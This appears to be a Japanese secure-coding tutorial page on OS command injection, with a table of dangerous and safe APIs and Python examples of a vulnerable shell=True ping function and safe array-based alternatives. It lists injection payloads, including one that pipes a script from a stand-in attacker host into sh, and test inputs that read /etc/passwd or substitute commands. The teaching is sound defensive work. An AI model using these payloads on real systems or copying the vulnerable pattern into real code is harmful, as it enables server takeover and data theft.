import AffiliateBanner from '@site/src/components/AffiliateBanner';

# コマンドインジェクション

## コマンドインジェクションとは

> コマンドインジェクション（OS Command Injection）は、アプリケーションがユーザー入力をシェルコマンドの一部として実行する際に、攻撃者が任意の OS コマンドを注入・実行できる脆弱性であり、サーバの完全な乗っ取りにつながる最も深刻な脆弱性の一つである。

Web アプリケーションが `ping`・`nslookup`・`convert`（ImageMagick）などの外部コマンドをシステムコールで呼び出す際、ユーザーが入力した値をコマンド文字列に直接組み込むと、シェルの特殊文字（`;`・`|`・`&&`・`$(...)`・バックティックなど）を使ってコマンドを追加・置換できてしまう。

**攻撃の例（概念的な説明）：**
- 入力 `8.8.8.8; cat /etc/passwd` → `ping 8.8.8.8; cat /etc/passwd` として実行
- パイプライン：`8.8.8.8 | id` → 実行ユーザー情報が返る
- コマンド置換：`$(curl http://attacker.example.com/shell.sh | sh)`

**影響：**
- 任意コマンドの実行（ランサムウェアの設置、バックドアの作成）
- 機密ファイルの読み取り（秘密鍵、環境変数、設定ファイル）
- ネットワーク内横断移動の起点

**防御の第一原則：シェルを経由しない**
`os.system()` や `subprocess.run(shell=True)` はシェルを経由するため危険である。代わりに引数を配列として渡す `subprocess.run([cmd, arg1, arg2])` を使えばシェル展開が発生しない。

## 安全でない API と安全な代替手段

| 言語 | 危険なAPI | 安全な代替 |
|------|---------|-----------|
| Python | `os.system(cmd)`, `subprocess.run(cmd, shell=True)` | `subprocess.run([cmd, arg], shell=False)` |
| PHP | `exec(str)`, `shell_exec(str)`, `system(str)` | 外部コマンド呼び出し自体を避ける |
| Node.js | `exec(str)` (child_process) | `execFile(file, args)` または `spawn(file, args)` |
| Java | `Runtime.exec(String)` | `Runtime.exec(String[])` で引数を分割 |
| Ruby | `system("cmd #{input}")` | `system("cmd", input)` で引数を分割 |

```python
import subprocess
import shlex
import ipaddress

# === 脆弱なコード例（絶対に使わない）===
def vulnerable_ping(host: str) -> str:
    """【悪い例】shell=True でユーザー入力を直接展開"""
    # 攻撃例: host = "8.8.8.8; cat /etc/shadow"
    result = subprocess.run(f"ping -c 1 {host}", shell=True, capture_output=True, text=True)
    return result.stdout
    # シェルが `; cat /etc/shadow` を追加コマンドとして実行する

# === 防御策1: 引数を配列として渡す（最重要）===
def safe_ping(host: str) -> str:
    """
    【良い例】コマンドを配列で渡すとシェルを経由しない
    ユーザー入力はコマンドの「引数」として扱われ、コマンドに展開されない
    """
    # 入力値の事前検証（IP アドレスのみ許可）
    try:
        ipaddress.ip_address(host)  # 有効な IP アドレスかチェック
    except ValueError:
        raise ValueError(f"無効な IP アドレス: {host}")

    result = subprocess.run(
        ["/bin/ping", "-c", "1", host],  # 配列で渡す（shell=False がデフォルト）
        capture_output=True,
        text=True,
        timeout=5,        # タイムアウトを設定
        check=False,      # 非ゼロ終了でも例外を発生させない
    )
    return result.stdout

# === 防御策2: 入力値の厳格な検証（許可リスト方式）===
def safe_dns_lookup(hostname: str) -> str:
    """ホスト名は許可リストのパターンのみ受け付ける"""
    import re
    # RFC 1123 に準拠したホスト名のみ許可
    hostname_pattern = re.compile(
        r'^([a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?\.)+[a-zA-Z]{2,}$'
    )
    if not hostname_pattern.match(hostname) or len(hostname) > 253:
        raise ValueError(f"無効なホスト名: {hostname}")

    # socket モジュールで DNS 解決（外部コマンド不要）
    import socket
    try:
        addresses = socket.getaddrinfo(hostname, None)
        return str(addresses[0][4][0])
    except socket.gaierror as e:
        return f"DNS 解決失敗: {e}"

# テスト
test_hosts = [
    "8.8.8.8",                    # 有効な IP
    "8.8.8.8; cat /etc/passwd",   # インジェクション試み
    "$(id)",                       # コマンド置換
    "`whoami`",                    # バックティック置換
]

for host in test_hosts:
    try:
        result = safe_ping(host)
        print(f"[OK] {host}: ping 成功")
    except ValueError as e:
        print(f"[BLOCKED] {host}: {e}")
    except Exception as e:
        print(f"[ERROR] {host}: {e}")

print("""
外部コマンドを避けるための代替手段:
- ping の代替 → socket.connect() / icmplib ライブラリ
- DNS 解決の代替 → socket.getaddrinfo()
- 画像変換の代替 → Pillow ライブラリ（ImageMagick の代替）
- アーカイブ操作 → zipfile / tarfile モジュール
""")
```

## 使用場面

- ネットワーク診断ツール（ping・nslookup・traceroute）の Web インターフェース
- ファイル変換・画像処理に外部コマンドを使用する機能
- CI/CD パイプラインでのユーザー入力を含むシェルスクリプトの実行
- コードレビューにおける `shell=True` の使用箇所の特定と修正

## 参考文献

- [OWASP - OS Command Injection Defense Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html)
- [Python ドキュメント - subprocess のセキュリティ注意事項](https://docs.python.org/ja/3/library/subprocess.html#security-considerations)
- [PortSwigger - OS command injection](https://portswigger.net/web-security/os-command-injection)
- [CWE-78: Improper Neutralization of Special Elements used in an OS Command](https://cwe.mitre.org/data/definitions/78.html)

<AffiliateBanner site="security_navi" />
